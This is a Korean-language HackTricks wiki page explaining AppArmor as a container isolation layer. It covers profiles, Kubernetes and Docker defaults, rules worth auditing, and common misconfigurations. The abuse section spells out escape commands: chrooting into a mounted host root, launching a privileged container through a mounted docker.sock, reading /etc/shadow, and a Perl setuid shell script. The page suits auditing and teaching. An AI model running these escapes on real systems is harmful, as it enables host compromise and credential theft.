# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor는 프로그램별 프로필을 통해 제한을 적용하는 **강제 접근 제어(Mandatory Access Control)** 시스템입니다. 사용자 및 그룹 소유권에 크게 의존하는 기존 DAC 검사와 달리, AppArmor를 사용하면 커널이 프로세스 자체에 연결된 정책을 강제할 수 있습니다. 컨테이너 환경에서는 워크로드에 어떤 동작을 시도할 만큼의 기존 권한이 있더라도, AppArmor 프로필이 관련 경로, mount, 네트워크 동작 또는 capability 사용을 허용하지 않으면 해당 동작이 거부될 수 있다는 점이 중요합니다.

가장 중요한 개념은 AppArmor가 **경로 기반**이라는 점입니다. SELinux처럼 레이블을 사용하는 대신 경로 규칙을 통해 파일 시스템 접근을 판단합니다. 따라서 이해하기 쉽고 강력하지만, bind mount와 대체 경로 레이아웃을 주의 깊게 살펴봐야 합니다. 동일한 호스트 콘텐츠에 다른 경로로 접근할 수 있게 되면, 정책의 효과가 운영자가 처음 예상한 것과 다를 수 있습니다.

## Role In Container Isolation

컨테이너 보안 검토는 capabilities와 seccomp까지만 살펴보는 경우가 많지만, 이러한 검사가 끝난 뒤에도 AppArmor는 여전히 중요합니다. 필요 이상으로 많은 권한을 가진 컨테이너나 운영상의 이유로 capability가 하나 더 필요한 워크로드를 생각해 보세요. AppArmor는 파일 접근, mount 동작, 네트워킹 및 실행 패턴을 계속 제한하여 명백한 악용 경로를 차단할 수 있습니다. 따라서 "애플리케이션을 작동시키기 위해" AppArmor를 비활성화하면, 단순히 위험한 설정이 적극적으로 악용 가능한 설정으로 조용히 바뀔 수 있습니다.

## Lab

호스트에서 AppArmor가 활성화되어 있는지 확인하려면 다음을 실행합니다:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

현재 컨테이너 프로세스가 어떤 프로파일로 실행 중인지 확인하려면:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

차이점은 참고할 만합니다. 일반적인 경우 프로세스에는 runtime이 선택한 profile에 연결된 AppArmor context가 표시되어야 합니다. unconfined 상태에서는 추가적인 제한 계층이 사라집니다.

Docker가 적용했다고 판단하는 내용을 확인할 수도 있습니다:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## 런타임 사용

호스트가 지원하는 경우 Docker는 기본 AppArmor 프로필이나 사용자 지정 AppArmor 프로필을 적용할 수 있습니다. Podman도 AppArmor 기반 시스템에서 AppArmor와 통합할 수 있지만, SELinux를 우선하는 배포판에서는 다른 MAC 시스템이 주로 사용됩니다. Kubernetes는 실제로 AppArmor를 지원하는 노드에서 워크로드 수준의 AppArmor 정책을 적용할 수 있습니다. LXC와 관련 Ubuntu 계열 시스템 컨테이너 환경에서도 AppArmor를 광범위하게 사용합니다.

실무에서 중요한 점은 AppArmor가 "Docker 기능"이 아니라는 것입니다. AppArmor는 여러 런타임이 적용할 수 있는 호스트 커널 기능입니다. 호스트가 이를 지원하지 않거나 런타임이 unconfined로 실행되도록 설정되어 있다면, 기대하는 보호 기능은 실제로 적용되지 않습니다.

Kubernetes의 경우 최신 API는 `securityContext.appArmorProfile`입니다. Kubernetes `v1.30`부터 이전 beta AppArmor annotation은 deprecated되었습니다. 지원되는 호스트에서 `RuntimeDefault`는 기본 프로필이며, `Localhost`는 노드에 이미 로드되어 있어야 하는 프로필을 가리킵니다. 매니페스트가 AppArmor를 사용하는 것처럼 보여도, 실제로는 노드 측 지원과 미리 로드된 프로필에 전적으로 의존할 수 있으므로 검토 시 이 점이 중요합니다.<sup>[[1]](#references)</sup>

유용하지만 놓치기 쉬운 운영상 세부 사항은 `appArmorProfile.type: RuntimeDefault`를 명시적으로 설정하는 것이 해당 필드를 생략하는 것보다 더 엄격하다는 점입니다. 필드를 명시적으로 설정했는데 노드가 AppArmor를 지원하지 않으면 admission이 실패해야 합니다. 필드를 생략하면 AppArmor가 없는 노드에서도 워크로드가 실행될 수 있으며, 추가 격리 계층은 적용되지 않습니다. 공격자 관점에서는 매니페스트와 실제 노드 상태를 모두 확인해야 하는 좋은 이유입니다.<sup>[[1]](#references)</sup>

AppArmor를 지원하는 Docker 호스트에서 가장 잘 알려진 기본 프로필은 `docker-default`입니다. 이 프로필은 Moby의 AppArmor 템플릿에서 생성되며, capability 기반 PoC가 기본 컨테이너에서 여전히 실패하는 이유를 설명하는 데 중요합니다. 대략적으로 `docker-default`는 일반적인 네트워킹을 허용하고, `/proc`의 많은 부분에 대한 쓰기를 거부하며, `/sys`의 민감한 부분에 대한 접근을 거부하고, mount 작업을 차단하며, ptrace를 일반적인 호스트 탐색 수단으로 사용할 수 없도록 제한합니다. 이 기본 동작을 이해하면 "컨테이너에 `CAP_SYS_ADMIN`이 있다"는 것과 "관심 있는 커널 인터페이스에 해당 capability를 실제로 사용할 수 있다"는 것을 구분하는 데 도움이 됩니다.

## 프로필 관리

AppArmor 프로필은 보통 `/etc/apparmor.d/`에 저장됩니다. 일반적인 이름 지정 규칙은 실행 파일 경로의 슬래시를 점으로 바꾸는 것입니다. 예를 들어 `/usr/bin/man`의 프로필은 보통 `/etc/apparmor.d/usr.bin.man`에 저장됩니다. 이 점은 방어와 평가 모두에서 중요합니다. 활성 프로필 이름을 알면 호스트에서 해당 파일을 빠르게 찾을 수 있는 경우가 많기 때문입니다.

유용한 호스트 측 관리 명령은 다음과 같습니다:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

컨테이너 보안 참고 자료에서 이러한 명령이 중요한 이유는 프로파일을 실제로 어떻게 만들고, 로드하고, complain mode로 전환하고, 애플리케이션 변경 후 수정하는지 설명하기 때문입니다. 문제를 해결하는 동안 프로파일을 complain mode로 전환한 뒤 enforcement로 되돌리는 것을 잊는 습관이 운영자에게 있다면, 문서상으로는 컨테이너가 보호되는 것처럼 보여도 실제로는 훨씬 느슨하게 동작할 수 있습니다.

### 프로파일 빌드 및 업데이트

`aa-genprof`는 애플리케이션 동작을 관찰하고 대화형으로 프로파일을 생성하는 데 도움을 줍니다:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof`는 나중에 `apparmor_parser`로 로드할 수 있는 템플릿 프로파일을 생성할 수 있습니다:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

바이너리가 변경되어 정책을 업데이트해야 할 때, `aa-logprof`는 로그에서 발견된 거부 기록을 재생하고 운영자가 허용할지 거부할지 결정하도록 지원합니다:

```bash
sudo aa-logprof
```

### 로그

AppArmor 거부 이벤트는 `auditd`, syslog 또는 `aa-notify` 같은 도구를 통해 확인할 수 있습니다:

```bash
sudo aa-notify -s 1 -v
```

이는 운영 및 공격 측면에서 유용합니다. 방어자는 이를 사용해 프로파일을 개선합니다. 공격자는 이를 통해 어떤 경로나 작업이 차단되는지, 그리고 AppArmor가 익스플로잇 체인을 막는 제어 요소인지 파악합니다.

### 정확한 프로파일 파일 식별

런타임에서 컨테이너에 특정 AppArmor 프로파일 이름이 표시되면, 해당 이름을 디스크의 프로파일 파일에 대응시켜 확인하는 것이 유용한 경우가 많습니다:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

이는 특히 host 측 검토 시 유용합니다. 컨테이너에 "profile `lowpriv`로 실행 중"이라고 표시되는 것과 "실제 규칙은 감사하거나 다시 로드할 수 있는 특정 파일에 있다"는 사실 사이의 간극을 메워 주기 때문입니다.

### 감사할 주요 규칙

profile을 읽을 수 있다면 단순한 `deny` 행만 확인하고 끝내지 마세요. 여러 규칙 유형은 컨테이너 escape 시도에 대해 AppArmor가 얼마나 효과적인지 크게 바꿉니다:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: 대상 바이너리를 unconfined 상태로 실행합니다. 접근 가능한 helper, shell 또는 interpreter가 `ux`로 허용되어 있다면, 보통 가장 먼저 테스트할 항목입니다.
- `px` / `Px` 및 `cx` / `Cx`: exec 시 profile 전환을 수행합니다. 이것이 자동으로 나쁜 것은 아니지만, 현재 profile보다 훨씬 광범위한 profile로 전환될 수 있으므로 감사할 가치가 있습니다.
- `change_profile`: 작업이 즉시 또는 다음 exec 시 다른 로드된 profile로 전환되도록 허용합니다. 대상 profile이 더 약하다면, 제한적인 도메인에서 의도한 탈출구가 될 수 있습니다.
- `flags=(complain)`, `flags=(unconfined)` 또는 최신 `flags=(prompt)`: profile을 얼마나 신뢰할지 판단할 때 고려해야 합니다. `complain`은 차단을 적용하는 대신 거부를 기록하고, `unconfined`는 경계를 없애며, `prompt`는 커널이 직접 적용하는 거부가 아니라 userspace의 결정 경로에 의존합니다.
- `userns` 또는 `userns create,`: 최신 AppArmor policy는 user namespace 생성을 제어할 수 있습니다. 컨테이너 profile에서 이를 명시적으로 허용하면, 플랫폼이 hardening 전략의 일부로 AppArmor를 사용하더라도 중첩 user namespace를 사용할 수 있습니다.

유용한 host 측 grep:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

이러한 종류의 감사는 일반적인 파일 규칙 수백 개를 들여다보는 것보다 더 유용한 경우가 많습니다. breakout이 helper 실행, 새 namespace 진입, 또는 덜 제한적인 profile로 탈출하는 데 달려 있다면, 답은 흔히 `deny /etc/shadow r` 같은 뻔한 규칙이 아니라 이러한 전환 중심 규칙에 숨어 있습니다.

## Misconfigurations

가장 명백한 실수는 `apparmor=unconfined`입니다. 관리자는 profile이 위험하거나 예상치 못한 동작을 제대로 차단해 실패한 애플리케이션을 디버깅할 때 이 설정을 자주 사용합니다. 이 플래그가 운영 환경에 남아 있으면 MAC 계층이 사실상 제거된 것입니다.

또 다른 미묘한 문제는 파일 권한이 정상적으로 보인다는 이유로 bind mount가 무해하다고 가정하는 것입니다. AppArmor는 경로 기반이므로, 대체 mount 경로 아래에 호스트 경로를 노출하면 경로 규칙과 충돌할 수 있습니다. 세 번째 실수는 설정 파일의 profile 이름만으로는 충분하지 않으며, 호스트 커널이 실제로 AppArmor를 적용하고 있어야 한다는 점을 잊는 것입니다.

## Abuse

AppArmor가 비활성화되면 이전에는 제한되던 작업이 갑자기 가능해질 수 있습니다. 예를 들어 bind mount를 통해 민감한 경로를 읽거나, 접근하기 어려워야 했던 procfs 또는 sysfs의 일부에 접근하거나, capability/seccomp도 허용하는 경우 mount 관련 작업을 수행하거나, 일반적으로 profile이 거부하는 경로를 사용하는 경우입니다. capability 기반 breakout 시도가 이론상으로는 "성공해야 하는데도" 실제로 실패하는 이유를 설명해 주는 메커니즘이 AppArmor인 경우가 많습니다. AppArmor를 제거하면 같은 시도가 성공하기 시작할 수 있습니다.

AppArmor가 path-traversal, bind-mount 또는 mount 기반 abuse chain을 막는 주요 요소라고 의심된다면, 보통 첫 단계는 profile 유무에 따라 접근 가능한 항목을 비교하는 것입니다. 예를 들어 컨테이너 내부에 호스트 경로가 mount되어 있다면, 우선 해당 경로를 탐색하고 읽을 수 있는지 확인합니다:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

컨테이너에 `CAP_SYS_ADMIN`과 같은 위험한 capability도 있다면, 가장 실용적인 테스트 중 하나는 AppArmor가 mount 작업이나 민감한 커널 파일 시스템에 대한 접근을 차단하는지 확인하는 것입니다:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

호스트 경로를 bind mount로 이미 사용할 수 있는 환경에서는 AppArmor가 비활성화되면 읽기 전용 정보 공개 문제가 호스트 파일에 직접 접근할 수 있는 문제로 바뀔 수도 있습니다:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

이 명령의 핵심은 AppArmor만으로 탈출이 가능해진다는 것이 아닙니다. AppArmor를 제거하면 파일 시스템 및 마운트 기반의 여러 악용 경로를 즉시 테스트할 수 있게 된다는 점입니다.

### 전체 예제: AppArmor 비활성화 + 호스트 루트 마운트

컨테이너에 이미 호스트 루트가 `/host`에 bind-mount되어 있다면, AppArmor를 제거해 차단되어 있던 파일 시스템 악용 경로를 완전한 호스트 탈출 경로로 바꿀 수 있습니다:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

shell이 host filesystem을 통해 실행되면, workload는 사실상 컨테이너 경계를 탈출한 상태입니다:

```bash
id
hostname
cat /etc/shadow | head
```

### 전체 예시: AppArmor 비활성화 + 런타임 소켓

실제 장벽이 런타임 상태를 보호하는 AppArmor였다면, 마운트된 소켓만으로도 완전한 escape가 가능할 수 있습니다:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

정확한 경로는 마운트 지점에 따라 다르지만, 결과는 같습니다. AppArmor가 더 이상 runtime API에 대한 접근을 차단하지 않으며, runtime API를 통해 호스트를 침해하는 컨테이너를 실행할 수 있습니다.

### 전체 예시: 경로 기반 Bind-Mount 우회

AppArmor는 경로 기반이므로, `/proc/**`를 보호한다고 해서 다른 경로를 통해 접근할 수 있는 동일한 호스트 procfs 콘텐츠까지 자동으로 보호되는 것은 아닙니다:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

영향은 정확히 무엇이 마운트되어 있는지, 그리고 대체 경로가 다른 제어도 우회하는지에 따라 달라집니다. 하지만 이 패턴은 AppArmor를 독립적으로 평가하지 말고 마운트 구성과 함께 평가해야 하는 가장 명확한 이유 중 하나입니다.

### 전체 예시: Shebang 우회

AppArmor는 shebang에 지정된 인터프리터가 아니라 실행된 스크립트 경로에 프로필을 연결할 수 있습니다. 반대로 인터프리터를 직접 호출하면 해당 인터프리터의 프로필이 선택될 수 있습니다. [AppArmor 유지 관리자가 이 차이를 설명합니다](https://bugs.launchpad.net/apparmor/+bug/1911431). 과거 사례에서는 첫 번째 줄이 제한된 인터프리터를 가리키는 스크립트가 사용되었습니다:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

이 예시는 interpreter의 file capability가 유효해지고 스크립트의 실제 exec attachment가 해당 작업을 허용하는 경우에만 후보가 됩니다. 로드된 policy와 process label, capability bounding set, `no_new_privs`, 그리고 mount의 `nosuid` 상태를 확인하세요. profile 파일 이름이나 `cap_setuid+ep` 항목만으로는 실제로 사용할 수 있는 전환임을 입증할 수 없습니다. Interpreter chain과 대체 실행 경로는 별도로 검토해야 합니다.

## 점검

이 점검의 목표는 세 가지 질문에 빠르게 답하는 것입니다. 호스트에서 AppArmor가 활성화되어 있는가, 현재 process가 confinement 상태인가, runtime이 이 container에 실제로 profile을 적용했는가?

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

여기서 흥미로운 점은 다음과 같습니다.

- `/proc/self/attr/current`에 `unconfined`가 표시되면, 해당 워크로드는 AppArmor 격리의 이점을 누리지 못하고 있습니다.
- `aa-status`에 AppArmor가 비활성화되었거나 로드되지 않은 것으로 표시되면, 런타임 설정에 있는 프로필 이름은 대부분 장식에 불과합니다.
- `docker inspect`에 `unconfined` 또는 예상과 다른 커스텀 프로필이 표시된다면, 파일시스템 또는 mount 기반 악용 경로가 작동하는 이유인 경우가 많습니다.
- `/sys/kernel/security/apparmor/profiles`에 예상한 프로필이 없다면, 런타임이나 오케스트레이터 설정만으로는 충분하지 않습니다.
- 보안이 강화된 것으로 알려진 프로필에 `ux`, 광범위한 `change_profile`, `userns` 또는 `flags=(complain)` 형태의 규칙이 있다면, 실제 보안 경계는 프로필 이름이 암시하는 것보다 훨씬 약할 수 있습니다.

운영상의 이유로 컨테이너에 이미 높은 권한이 부여된 경우에도 AppArmor를 활성화해 두면, 통제된 예외와 훨씬 광범위한 보안 실패가 갈릴 수 있습니다.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor를 지원하는 호스트에서 기본 활성화 | 별도로 지정하지 않으면 `docker-default` AppArmor 프로필 사용 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 호스트에 따라 다름 | `--security-opt`를 통해 AppArmor를 지원하지만, 정확한 기본 설정은 호스트와 런타임에 따라 다르며 Docker의 문서화된 `docker-default` 프로필만큼 보편적이지 않음 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 기본 설정은 조건부 | `appArmorProfile.type`을 지정하지 않으면 기본값은 `RuntimeDefault`이지만, 노드에서 AppArmor가 활성화된 경우에만 적용됨 | `securityContext.appArmorProfile.type: Unconfined`, 취약한 프로필을 사용하는 `securityContext.appArmorProfile.type: Localhost`, AppArmor를 지원하지 않는 노드 |
| containerd / CRI-O under Kubernetes | 노드 및 런타임 지원을 따름 | Kubernetes가 지원하는 일반적인 런타임은 AppArmor를 지원하지만, 실제 적용 여부는 여전히 노드 지원과 워크로드 설정에 따라 달라짐 | Kubernetes 행과 동일하며, 런타임을 직접 설정하면 AppArmor를 완전히 건너뛸 수도 있음 |

AppArmor에서 가장 중요한 변수는 런타임뿐 아니라 **호스트**인 경우가 많습니다. AppArmor가 활성화되지 않은 노드에서는 매니페스트에 프로필을 설정해도 격리가 적용되지 않습니다.

## References

- [1] [Kubernetes 보안 컨텍스트: AppArmor 프로필 필드 및 노드 지원 동작](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage: exec 전환, `change_profile`, `userns` 및 프로필 플래그](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
